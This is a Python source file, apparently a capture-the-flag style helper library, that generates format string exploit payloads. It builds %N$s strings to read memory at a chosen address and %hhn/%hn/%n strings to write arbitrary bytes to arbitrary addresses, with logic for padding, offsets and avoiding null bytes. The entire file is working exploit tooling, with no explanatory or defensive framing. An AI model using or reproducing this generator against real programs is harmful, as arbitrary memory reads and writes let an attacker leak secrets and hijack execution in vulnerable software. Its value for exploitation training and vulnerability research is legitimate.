#!/usr/bin/env python3
import operator
import struct
import math


def unpack_bytes(endianness, value):
    if isinstance(value, list):
        value = bytes(value)

    assert isinstance(value, bytes)

    if len(value) == 1:
        return value[0]
    elif len(value) == 2:
        return struct.unpack(endianness + 'H', value)[0]
    elif len(value) == 4:
        return struct.unpack(endianness + 'I', value)[0]
    elif len(value) == 8:
        return struct.unpack(endianness + 'Q', value)[0]


class NullByteException(Exception):
    pass


class PayloadSettings:
    def __init__(self, offset, padding=0, address_fmt='@I', null_bytes=True):
        '''
        Args:
            offset (int): The offset of your buffer
            padding (int): The needed padding
            address_fmt (string): The format for an address (see struct.pack)
            null_bytes (bool): Null bytes are allowed
        '''
        assert 0 <= padding <= 3
        self.offset = offset
        self.padding = padding
        self.address_fmt = address_fmt
        self.null_bytes = null_bytes

    def padding_byte(self):
        return b'\x00' if self.null_bytes else b'\xff'

    def endianness(self):
        if self.address_fmt[0] in ('@', '<', '>'):
            return self.address_fmt[0]
        else:
            return '@'

    def check_null_bytes(self, payload):
        if not self.null_bytes and b'\x00' in payload:
            raise NullByteException('generated payload contains a null byte')


class ReadPayload:
    '''
    Read a null-terminated string at `address`
    '''

    def __init__(self, address):
        assert isinstance(address, int)
        self.address = address

    def generate(self, settings, start_len=0):
        '''
        Generate a format string to read at `address`

        Args:
            settings (PayloadSettings): Settings for the payload
            start_len (int): The length of already printed data

        Returns:
            The payload to read at `address`
        '''
        offset = settings.offset
        offset += 3 # %x$s + padding
        offset += math.ceil(start_len / 4) # start_len

        payload = b'%' + str(offset).encode('ascii') + b'$s'
        assert settings.padding + 4 * (offset - settings.offset) - start_len - len(payload) >= 0, 'bad padding'
        payload += settings.padding_byte() * (settings.padding + 4 * (offset - settings.offset) - start_len - len(payload))
        payload += struct.pack(settings.address_fmt, self.address)
        settings.check_null_bytes(payload)
        return payload


class WritePayload:
    '''
    Write in memory
    '''

    def __init__(self):
        self.memory = {}

    def __setitem__(self, address, value):
        assert isinstance(address, int)
        assert isinstance(value, bytes)

        for i, byte in enumerate(value):
            self.memory[address + i] = byte

    def _generate_writes(self, settings):
        '''
        Generate a list of write operations to perform
        '''
        writes = []
        endianness = settings.endianness()
        addresses = sorted(self.memory.keys())

        i = 0
        while i < len(addresses):
            addr = addresses[i]

            if (not settings.null_bytes
                    and b'\x00' in struct.pack(settings.address_fmt, addr)):
                # null byte in address, try to write at addr - 1

                if b'\x00' in struct.pack(settings.address_fmt, addr - 1):
                    raise NullByteException('generated payload contains a null byte')

                byte0 = self.memory[addr - 1] if addr - 1 in self.memory else 0

                if all(addr + j in self.memory for j in range(3)):
                    value = unpack_bytes(endianness, [byte0, self.memory[addr], self.memory[addr + 1], self.memory[addr + 2]])
                    if value <= 0xffff: # write 4 bytes
                        writes.append((addr - 1, value, 4))
                        i += 3
                        continue

                # write 2 bytes
                writes.append((addr - 1,
                               unpack_bytes(endianness, [byte0, self.memory[addr]]),
                               2))
                i += 1
            else:
                if all(addr + j in self.memory for j in range(4)):
                    value = unpack_bytes(endianness, [self.memory[addr], self.memory[addr + 1], self.memory[addr + 2], self.memory[addr + 3]])
                    if value <= 0xffff: # write 4 bytes
                        writes.append((addr, value, 4))
                        i += 4
                        continue

                if addr + 1 in self.memory: # write 2 bytes
                    writes.append((addr,
                                   unpack_bytes(endianness, [self.memory[addr], self.memory[addr + 1]]),
                                   2))
                    i += 2
                else: # write 1 byte
                    writes.append((addr,
                                   unpack_bytes(endianness, [self.memory[addr]]),
                                   1))
                    i += 1

        return writes

    def generate(self, settings, start_len=0):
        assert self.memory, 'empty payload'

        # generate write operations
        writes = self._generate_writes(settings)

        # sort them by value
        writes.sort(key=operator.itemgetter(1))

        assert start_len <= writes[0][1], 'start length too big'
        write_specifier = {1: b'hhn', 2: b'hn', 3: b'n'}

        # compute the offset
        offset = settings.offset
        offset += 1 # padding
        offset += math.ceil(start_len / 4) # start_len

        estimated_payload_len = 0
        current_value = start_len
        for addr, value, size in writes:
            print_len = value - current_value
            current_value = value

            if print_len > 2:
                estimated_payload_len += len('%%%dc' % print_len)
            else:
                estimated_payload_len += print_len

            estimated_payload_len += len('%%%d$%s' % (99999, write_specifier[size]))

        offset += math.ceil(estimated_payload_len / 4)

        # generate the payload
        payload = b''
        addresses = b''
        current_value = start_len
        start_offset = offset
        for addr, value, size in writes:
            print_len = value - current_value
            current_value = value

            if print_len > 2:
                payload += b'%' + str(print_len).encode('ascii') + b'c'
            else:
                payload += b'A' * print_len

            payload += b'%' + str(offset).encode('ascii') + b'$' + write_specifier[size]
            addresses += struct.pack(settings.address_fmt, addr)
            offset += 1

        assert settings.padding + 4 * (start_offset - settings.offset) - start_len - len(payload) >= 0, 'bad padding'
        payload += settings.padding_byte() * (settings.padding + 4 * (start_offset - settings.offset) - start_len - len(payload))
        payload += addresses
        settings.check_null_bytes(payload)
        return payload
